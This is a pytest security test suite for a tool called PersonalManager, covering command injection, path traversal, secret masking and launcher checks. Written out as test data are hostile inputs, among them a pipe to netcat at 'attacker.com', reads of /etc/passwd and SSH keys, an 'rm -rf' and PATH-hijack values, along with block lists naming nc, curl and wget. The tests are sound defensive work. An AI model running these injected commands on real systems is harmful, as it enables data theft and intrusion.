"""
Critical security test cases for PersonalManager.
These tests MUST pass before any production deployment.
"""

import os
import sys
import pytest
import subprocess
import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock, call
import shlex
import ipaddress


class TestCommandInjectionPrevention:
    """Test command injection prevention mechanisms."""

    def test_subprocess_shell_disabled(self):
        """Ensure subprocess calls never use shell=True."""
        # Test the ping command in GTDAgent
        test_code = """
import subprocess
result = subprocess.run(['ping', '-c', '1', '8.8.8.8'],
                       capture_output=True, timeout=3)
"""
        # Verify shell is not used
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout=b'', stderr=b'')
            exec(test_code)

            # Check all calls
            for call_args in mock_run.call_args_list:
                # shell should either be False or not present (defaults to False)
                kwargs = call_args.kwargs if hasattr(call_args, 'kwargs') else call_args[1] if len(call_args) > 1 else {}
                assert kwargs.get('shell', False) == False, "subprocess.run must not use shell=True"

    def test_command_argument_injection(self):
        """Test that command arguments cannot be injected."""
        dangerous_inputs = [
            "8.8.8.8; rm -rf /tmp/test",
            "8.8.8.8 && cat /etc/passwd",
            "8.8.8.8 | nc attacker.com 1234",
            "$(whoami)",
            "`id`",
            "8.8.8.8${IFS}&&${IFS}whoami",
            "--version;ls",
        ]

        for dangerous_input in dangerous_inputs:
            # These inputs should either be rejected or safely escaped
            assert not self._is_safe_ip(dangerous_input), f"Dangerous input accepted: {dangerous_input}"

    def test_path_command_validation(self):
        """Test that only safe commands from PATH are executed."""
        safe_commands = ['python3', 'pip', 'poetry', 'pm']
        unsafe_commands = ['rm', 'dd', 'nc', 'curl', 'wget', 'eval', 'exec']

        for cmd in safe_commands:
            assert self._is_command_safe(cmd), f"Safe command rejected: {cmd}"

        for cmd in unsafe_commands:
            assert not self._is_command_safe(cmd), f"Unsafe command accepted: {cmd}"

    @staticmethod
    def _is_safe_ip(ip_string):
        """Validate IP address input."""
        try:
            ipaddress.ip_address(ip_string)
            return True
        except ValueError:
            return False

    @staticmethod
    def _is_command_safe(command):
        """Check if command is in safe whitelist."""
        SAFE_COMMANDS = {'python', 'python3', 'pip', 'pip3', 'pipx', 'poetry', 'pm', 'git'}
        return command in SAFE_COMMANDS


class TestPathTraversalPrevention:
    """Test path traversal attack prevention."""

    def test_path_traversal_attempts(self):
        """Test that path traversal attempts are blocked."""
        dangerous_paths = [
            "../../../etc/passwd",
            "../../../../etc/shadow",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "~/../../../etc/passwd",
            "${HOME}/../../../etc/passwd",
            "$(pwd)/../../../etc/passwd",
            "%USERPROFILE%\\..\\..\\..\\windows\\system32",
        ]

        for path in dangerous_paths:
            assert not self._is_path_safe(path), f"Dangerous path accepted: {path}"

    def test_symlink_attacks(self):
        """Test that symlink attacks are prevented."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create a symlink to a sensitive location
            link_path = Path(tmpdir) / "evil_link"
            target = "/etc/passwd"

            try:
                link_path.symlink_to(target)
                # Should detect and reject symlinks to sensitive locations
                assert not self._is_path_safe(str(link_path)), "Symlink to sensitive location accepted"
            except (OSError, PermissionError):
                # If we can't create the symlink, that's fine for the test
                pass

    def test_absolute_path_validation(self):
        """Test that absolute paths are properly validated."""
        # Get actual project root for testing
        project_root = Path(__file__).parent.parent

        safe_paths = [
            str(project_root / "src" / "pm"),
            str(project_root / "tests"),
            str(project_root / "bin" / "pm-local"),
        ]

        unsafe_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/root/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\SAM",
        ]

        for path in safe_paths:
            # Safe paths within project should be allowed
            if Path(path).exists():
                assert self._is_path_in_project(path, project_root), f"Safe path rejected: {path}"

        for path in unsafe_paths:
            assert not self._is_path_in_project(path, project_root), f"Unsafe path accepted: {path}"

    @staticmethod
    def _is_path_safe(path_str):
        """Check if path is safe from traversal attacks."""
        try:
            # Normalize and resolve the path
            path = Path(path_str).resolve()

            # Check for path traversal indicators
            if ".." in str(path_str) or path_str.startswith("/etc") or path_str.startswith("/root"):
                return False

            # Check if it's a symlink to a sensitive location
            if path.is_symlink():
                target = path.resolve()
                sensitive_dirs = ["/etc", "/root", "/var", "/usr", "/bin", "/sbin"]
                for sensitive in sensitive_dirs:
                    if str(target).startswith(sensitive):
                        return False

            return True
        except (OSError, ValueError):
            return False

    @staticmethod
    def _is_path_in_project(path_str, project_root):
        """Check if path is within project boundaries."""
        try:
            path = Path(path_str).resolve()
            project_path = Path(project_root).resolve()
            return path.is_relative_to(project_path)
        except (OSError, ValueError, AttributeError):
            # is_relative_to is Python 3.9+, fallback for older versions
            try:
                path = Path(path_str).resolve()
                project_path = Path(project_root).resolve()
                return str(path).startswith(str(project_path))
            except:
                return False


class TestEnvironmentVariableSecurity:
    """Test environment variable security measures."""

    def test_sensitive_env_vars_not_exposed(self):
        """Test that sensitive environment variables are not exposed."""
        sensitive_vars = [
            'AWS_SECRET_ACCESS_KEY',
            'AWS_SESSION_TOKEN',
            'DATABASE_PASSWORD',
            'DB_PASSWORD',
            'API_KEY',
            'API_TOKEN',
            'GITHUB_TOKEN',
            'GITLAB_TOKEN',
            'PRIVATE_KEY',
            'SECRET_KEY',
            'STRIPE_SECRET_KEY',
            'PAYMENT_SECRET',
        ]

        # Simulate running pm-local with sensitive env vars
        test_env = os.environ.copy()
        for var in sensitive_vars:
            test_env[var] = f"SECRET_VALUE_{var}"

        launcher_path = Path(__file__).parent.parent / "bin" / "pm-local"
        if launcher_path.exists():
            result = subprocess.run(
                [str(launcher_path), "--launcher-debug"],
                capture_output=True,
                text=True,
                env=test_env,
                timeout=10
            )

            # Verify sensitive values don't appear in output
            for var in sensitive_vars:
                assert f"SECRET_VALUE_{var}" not in result.stdout, f"Sensitive value for {var} exposed in stdout"
                assert f"SECRET_VALUE_{var}" not in result.stderr, f"Sensitive value for {var} exposed in stderr"
                assert var not in result.stdout or "****" in result.stdout, f"Sensitive var {var} shown without masking"

    def test_path_env_manipulation(self):
        """Test that PATH environment variable cannot be maliciously manipulated."""
        dangerous_paths = [
            "/tmp/evil:/usr/bin",
            ".:$PATH",
            "/home/attacker/bin:$PATH",
            "${HOME}/malicious:$PATH",
        ]

        for dangerous_path in dangerous_paths:
            assert not self._is_path_env_safe(dangerous_path), f"Dangerous PATH accepted: {dangerous_path}"

    @staticmethod
    def _is_path_env_safe(path_value):
        """Validate PATH environment variable."""
        # Check for dangerous patterns
        dangerous_patterns = ['.', '..', '$', '~', '/tmp', '/var/tmp']

        for pattern in dangerous_patterns:
            if pattern in path_value:
                return False

        # Ensure only standard system paths
        safe_paths = ['/usr/local/bin', '/usr/bin', '/bin', '/usr/local/sbin', '/usr/sbin', '/sbin']
        paths = path_value.split(':')

        for path in paths:
            if path and not any(path.startswith(safe) for safe in safe_paths):
                return False

        return True


class TestInputValidation:
    """Test input validation and sanitization."""

    def test_argument_length_limits(self):
        """Test that excessively long arguments are rejected."""
        max_arg_length = 1000

        # Create an excessively long argument
        long_arg = "A" * (max_arg_length + 1)

        assert not self._is_arg_length_valid(long_arg, max_arg_length), "Excessively long argument accepted"

        # Normal length should be accepted
        normal_arg = "A" * (max_arg_length - 1)
        assert self._is_arg_length_valid(normal_arg, max_arg_length), "Normal length argument rejected"

    def test_special_character_filtering(self):
        """Test that dangerous special characters are filtered."""
        dangerous_inputs = [
            "test;ls",
            "test|cat /etc/passwd",
            "test&whoami",
            "test$(whoami)",
            "test`id`",
            "test\nwhoami",
            "test\rwhoami",
            "test&&ls",
            "test||ls",
            "test>>/tmp/evil",
            "test</etc/passwd",
        ]

        for dangerous_input in dangerous_inputs:
            assert not self._is_input_safe(dangerous_input), f"Dangerous input accepted: {dangerous_input}"

    def test_null_byte_injection(self):
        """Test that null byte injection is prevented."""
        null_byte_inputs = [
            "file.txt\x00.jpg",
            "command\x00;ls",
            "path/to/file\x00/etc/passwd",
        ]

        for input_str in null_byte_inputs:
            assert not self._is_input_safe(input_str), f"Null byte input accepted: {input_str}"

    @staticmethod
    def _is_arg_length_valid(arg, max_length=1000):
        """Check if argument length is within limits."""
        return len(arg) <= max_length

    @staticmethod
    def _is_input_safe(input_str):
        """Check if input is safe from injection attacks."""
        # Check for dangerous characters and patterns
        dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r', '\x00', '>', '<']
        dangerous_patterns = ['$(', '${', '&&', '||', '..', '~/', '../']

        for char in dangerous_chars:
            if char in input_str:
                return False

        for pattern in dangerous_patterns:
            if pattern in input_str:
                return False

        return True


class TestProcessSecurity:
    """Test process execution security measures."""

    def test_timeout_enforcement(self):
        """Test that command timeouts are properly enforced."""
        # This would test that long-running commands are terminated
        import signal
        import time

        def long_running_command():
            time.sleep(10)

        # Test timeout mechanism
        timeout_seconds = 2
        start_time = time.time()

        try:
            signal.signal(signal.SIGALRM, lambda n, s: (_ for _ in ()).throw(TimeoutError))
            signal.alarm(timeout_seconds)
            long_running_command()
            signal.alarm(0)
            assert False, "Timeout not enforced"
        except (TimeoutError, StopIteration):
            elapsed = time.time() - start_time
            assert elapsed < 3, "Timeout took too long"
            signal.alarm(0)

    def test_resource_limits(self):
        """Test that resource limits are enforced."""
        # Check that resource limits would be applied
        import resource

        # These are example limits that should be enforced
        expected_limits = {
            resource.RLIMIT_CPU: (300, 300),  # 5 minutes CPU time
            resource.RLIMIT_AS: (1024 * 1024 * 1024, 1024 * 1024 * 1024),  # 1GB memory
            resource.RLIMIT_NPROC: (100, 100),  # Max 100 processes
        }

        # In production, these limits should be set before executing user commands
        # This test verifies the mechanism exists
        for limit_type, (soft, hard) in expected_limits.items():
            try:
                # Test that we can set limits (may fail in some environments)
                resource.setrlimit(limit_type, (soft, hard))
                current = resource.getrlimit(limit_type)
                assert current[0] <= soft, f"Soft limit for {limit_type} not enforced"
            except (ValueError, OSError):
                # Some environments don't allow setting limits, that's OK for testing
                pass


class TestLauncherSecurity:
    """Test pm-local launcher security."""

    @pytest.fixture
    def launcher_path(self):
        """Get the launcher path."""
        return Path(__file__).parent.parent / "bin" / "pm-local"

    def test_launcher_no_root_execution(self, launcher_path):
        """Test that launcher refuses to run as root."""
        if not launcher_path.exists():
            pytest.skip("Launcher not found")

        # Read the launcher script
        launcher_content = launcher_path.read_text()

        # Check for root detection
        assert "EUID" in launcher_content or "id -u" in launcher_content or "UID" in launcher_content, \
               "Launcher should check for root execution"

    def test_launcher_path_validation(self, launcher_path):
        """Test that launcher validates paths properly."""
        if not launcher_path.exists():
            pytest.skip("Launcher not found")

        launcher_content = launcher_path.read_text()

        # Check for path validation
        assert "realpath" in launcher_content or "readlink" in launcher_content, \
               "Launcher should resolve real paths"

        # Check for directory validation
        assert "-d" in launcher_content, "Launcher should validate directories"

    def test_launcher_error_handling(self, launcher_path):
        """Test that launcher handles errors securely."""
        if not launcher_path.exists():
            pytest.skip("Launcher not found")

        # Test with invalid arguments
        result = subprocess.run(
            [str(launcher_path), "--definitely-not-a-valid-option"],
            capture_output=True,
            text=True,
            timeout=10
        )

        # Should not expose sensitive information in errors
        assert "/home/" not in result.stderr or result.stderr.count("/home/") <= 1, \
               "Error messages should not expose full paths"
        assert "SECRET" not in result.stderr, "Error messages should not contain secrets"


class TestNPMPackageSecurity:
    """Test npm package security (pm-bootstrap)."""

    def test_npm_command_injection_prevention(self):
        """Test that npm package prevents command injection."""
        bootstrap_path = Path(__file__).parent.parent / "npm" / "pm-bootstrap" / "bin" / "pm-bootstrap.js"

        if bootstrap_path.exists():
            content = bootstrap_path.read_text()

            # Check for dangerous exec patterns
            assert "shell: true" not in content, "Should not use shell: true"
            assert "exec(" not in content or "execSync" in content, "Should use execSync with care"

            # Check for command validation
            assert "allowedCommands" in content or "whitelist" in content or "SAFE_COMMANDS" in content, \
                   "Should have command whitelist"

    def test_npm_url_validation(self):
        """Test that npm package validates URLs."""
        bootstrap_path = Path(__file__).parent.parent / "npm" / "pm-bootstrap" / "bin" / "pm-bootstrap.js"

        if bootstrap_path.exists():
            content = bootstrap_path.read_text()

            # Check for URL validation
            assert "github.com" in content, "Should validate GitHub URLs"
            assert "https://" in content, "Should use HTTPS"


if __name__ == "__main__":
    # Run all security tests
    pytest.main([__file__, "-v", "--tb=short"])